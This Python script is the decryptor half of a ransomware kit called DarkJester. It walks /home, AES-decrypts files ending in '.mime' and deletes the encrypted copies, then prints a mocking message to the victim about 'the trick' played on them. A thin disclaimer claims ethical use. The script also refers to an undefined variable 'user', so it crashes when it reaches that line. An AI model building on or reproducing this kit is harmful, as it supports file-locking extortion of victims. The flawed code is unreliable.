banner = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠛⠛⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠋⠀⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⠶⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⢷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠟⠁⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⡶⢶⣦⡀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀⣴⡶⠿⠟⠛⠉⠉⠉⠉⠉⠙⠛⠿⢷⣦⣄⡀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⡟⠁⠀⠀⠸⠿⠛⠻⡾⠛⠻⣷⡄⠀⢀⣤⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣤⡀⠀⠀⠀⠀⣠⣾⠿⣶⣴⡾⠿⢷⣦⠀⠀⠀⠀
⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣴⡿⠋⠀⢀⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣄⠀⠀⠀⠙⠿⣦⡀⠀⢀⣿⠁⠀⠸⠏⠀⠀⠀⢻⣇⠀⠀⠀
⢀⣴⡿⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠋⠀⠀⠀⡼⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠈⢧⠀⠀⠀⠀⠙⣿⡶⠿⠛⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀
⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠟⠋⠀⠀⠀⠘⠗⠒⡒⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠙⠓⠾⠆⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠺⠟⠛⢷⣆⠀
⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⢠⣴⢾⣏⣿⢿⣆⠀⠀⠀⠀⠀⠀⠀⣴⣿⣛⣿⣶⡾⠀⠀⠀⠀⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆
⠈⢻⡷⠆⠀⠀⠀⠀⠀⠀⠀⠐⠿⣷⡄⠀⢀⣀⡀⠀⠈⣿⠘⠿⠟⠀⣿⡀⠀⠀⠀⠀⠀⣸⣇⠻⠿⠟⢸⡇⢀⣀⣀⡀⢼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃
⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠞⠉⠉⠙⢶⡀⠙⠷⣦⣶⠞⢋⣡⡴⠶⠶⢶⣤⣻⠻⣶⣤⣴⠟⣰⠋⠁⠀⠉⢻⡛⢿⣶⠆⠀⠀⠀⠀⠀⠀⣠⣴⡿⠋⠀
⠀⠈⠻⣷⣶⠇⠀⠀⠀⠀⠀⠀⣾⣿⡇⠀⠀⠀⠀⠀⡇⠀⠀⠀⢀⡶⠋⠁⠀⠀⠀⠀⠈⠛⢷⡄⠀⠀⠀⡇⠀⠀⠀⠀⠀⣷⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡄⠀
⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠈⣿⢳⣄⠀⠀⢀⣰⠃⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠳⣄⡀⠀⢀⡴⠋⠻⣷⡄⠀⠀⠀⠀⠀⠀⠀⣰⣿⠁⠀
⠀⠀⠀⠀⠻⢷⣶⣷⡀⠀⠀⣠⣾⡿⠀⠈⠛⠛⣫⡿⠟⠿⢶⣼⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣠⣴⠶⠾⣿⣍⠉⠀⠀⠀⢿⣇⠀⠀⢀⣶⣤⣴⠿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⠷⠾⠟⢿⡇⠀⠀⠀⢰⡟⣸⡆⠀⠀⠹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠋⠁⢸⣦⠈⢿⠀⠀⠀⠀⢈⣿⠿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⠀⢸⡇⠉⢿⣄⠀⠀⠹⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⣠⡟⠉⠀⣿⠀⠀⠀⠀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⢿⣄⠀⠹⣦⡀⠀⠈⠛⠶⢤⣤⣤⣤⠶⠛⠁⠀⣠⡾⠋⠀⠀⣼⠇⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠻⣦⡀⠈⠛⢷⣦⣄⡀⠀⠀⠀⠀⢀⣠⣴⠟⠋⠀⠀⣠⡾⠋⠀⠀⢀⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠀⠀⠙⠻⣦⣄⠀⠀⠉⠙⠛⠛⠛⠛⠉⠉⠀⠀⢀⣠⡾⠋⠀⠀⠀⣠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⡀⠀⠈⠙⠷⣦⣄⡀⠀⠀⠀⠀⣀⣀⣤⠶⠛⠁⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣷⣤⣀⠀⠀⠉⠛⠛⠛⠛⠛⠋⠉⠀⠀⠀⣀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⠷⣶⣦⣤⣤⣤⣤⣤⣤⣶⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠉⠉⠉⠁⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
________                __        ____.                __
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|
        \/     \/           \/             \/     \/            \/
                                                                ~ Decryptor
"""
"""
Disclaimer: DarkJester is intended solely for ethical and legitimate uses. We are not responsible for any malicious activities or unlawful actions that occur as a result of using DarkJester. It is your responsibility to ensure that the tool is used in compliance with all applicable laws and regulations. Misuse of DarkJester for harmful, illegal, or unauthorized purposes is strictly prohibited and will be at your own risk.
"""
import os
import base64
import threading
import subprocess as sp
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from concurrent.futures import ThreadPoolExecutor

def decrypt_file(encrypted_file_path, key):
    try:
        print(f"[*] Decryption Initialized: {encrypted_file_path}")
        with open(encrypted_file_path, 'rb') as enc_file:
            encrypted_data = enc_file.read()
        iv = encrypted_data[:16]
        cipher_text = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
        decrypted_file_path = encrypted_file_path.rsplit('.mime', 1)[0]
        with open(decrypted_file_path, 'wb') as dec_file:
            dec_file.write(decrypted_data)
        os.remove(encrypted_file_path)
        print(f"[+] Jester Successfully Retrieved your File: {encrypted_file_path}")
    except Exception as e:
        print(f"[-] Something went wrong, looks like Jester needs to check this again. Error decrypting {encrypted_file_path}: {e}")

def process_directory(root, files, key, max_threads=30):
    threads = []
    for file_name in files:
        if file_name.endswith('.mime'):
            file_path = os.path.join(root, file_name)
            print(f"[*] Jester is Preparing: {file_path}")
            while len(threads) >= max_threads:
                threads = [t for t in threads if t.is_alive()]
            thread = threading.Thread(target=decrypt_file, args=(file_path, key))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

def decrypt_directory(directory_path, key, max_threads=30):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for root, _, files in os.walk(directory_path):
            executor.submit(process_directory, root, files, key, max_threads)

def main():
    print(banner)
    key_input = input("[*] Provide the decryption key to Jester: ")
    if key_input == '':
        return
    try:
        key = base64.b64decode(key_input)
    except Exception as e:
        print(f"[-] {e}")
        return
    user_directory = f"/home"
    if os.path.exists(user_directory):
        print(f"[*] Jester is colecting all the files for this user: {user}")
        decrypt_directory(user_directory, key)
    else:
        print(f"[-] User directory for {user} does not exist or is inaccessible. Please don't make Jester dumb.")
    os.system('clear')
    print(banner)
    print("[+] Here you are! The trick has been played, and Jester has successfully undone the lock! Your files are free once more, restored to their rightful state. Consider this a lesson in the art of jest. A reminder, perhaps, that not all things are as serious as they seem! Thanksss for the entertainment. Jester takes a bow and bids you farewell... for now!")

if __name__ == '__main__':
    main()

